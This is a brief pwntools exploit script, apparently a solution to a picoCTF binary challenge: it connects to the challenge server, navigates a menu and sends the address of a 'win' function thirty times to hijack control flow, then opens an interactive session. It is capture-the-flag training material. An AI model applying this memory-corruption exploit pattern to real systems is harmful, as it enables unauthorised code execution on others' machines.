from pwn import *

exe = ELF('./chall')
context.binary = exe.path
# io = process(exe.path)
io = remote('mimas.picoctf.net', '49562')

win = 0x00000000004011a0

io.sendlineafter(b':', b'2')
io.sendlineafter(b':', pack(win) * 30)
io.sendlineafter(b':', b'4')

io.interactive()
